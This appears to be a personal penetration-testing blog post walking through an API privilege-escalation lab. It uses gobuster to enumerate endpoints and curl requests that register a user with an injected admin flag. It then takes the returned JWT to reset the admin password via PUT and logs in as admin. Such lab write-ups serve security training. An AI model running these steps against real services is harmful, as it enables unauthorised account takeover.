---
layout: post
title: API Priv Escalation
titledate: 08/25/23
tags: ["infosec","offsec","web", "api", "gobuster", "burpsuite"]
---

<h4>Brute Force with Gobuster</h4>

We can use Gobuster to brute force APIs by creating a pattern file
    {GOBUSTER}/v1
    {GOBUSTER}/v2

    $ gobuster dir -u http://192.168.128.20:2002 -w /usr/share/wordlists/dirb/big.txt -p pattern

We can then use curl to inspect the APIs that get returned

    $ curl -i http://192.168.128.20:2002/users/v1

From our response we get many users so we can take a look at what apis they have access to

    $ gobuster dir -u http://192.168.128.20:2002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

If we examine the password API

    $ curl -i http://192.168.128.20:2002/users/v1/admin/password

we get METHOD NOT ALLOWED indicating the API exists for the user but the GET method we are using is not supported
so we can try other HTTP methods to see what is supported

here we check if a certain api is supported for a user 

    $ curl -i http://192.168.128.20:2002/users/v1/login

    "USER NOT FOUND"

This response means the api exists but not for the user

We can use curl to pass an HTTP POST with json arguments for the admin user

    $ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.128.20:2002/users/v1/login

In this example the login fails with password incorrect, but indicates we have correct json login parameters for the api

<h4>User PRIV Escalation</h4>

One idea is to try and create a new user account with admin priveleges. From here maybe we can gain access and alter the existing admin account access

    $ curl -d '{"password":"lab","username":"dlo","email":"pwn@dlo.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.128.20:2002/users/v1/register

We correctly form the HTTP request with the username and password json parameters and all required other parameters but pass the parameter admin to test if it allows this

If we get a successful account creation, we can try to login with our newly created admin account

    $ curl -d '{"password":"lab","username":"dlo"}' -H 'Content-Type: application/json'  http://192.168.128.20:5002/users/v1/login

The response here will give us a JWT authentication token

Now we can try to login as the admin account with our new admin auth token and update the admin password

    $ curl  \
  'http://192.168.128.20:2002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

In this case we get method not allowed as a response so we can try an alternate HTTP method like PUT

    curl -X 'PUT' \
  'http://192.168.128.20:2002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'

If this works we should be able to login as the admin account via the api with our newly changed password

    $ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.128.20:2002/users/v1/login

<h4>Burpsuite API Testing</h4>

Burpsuite can be very useful in enumerating apis and allowing for quick testing of requests and responses. It will keep track of all of them in the sitemap for quick access






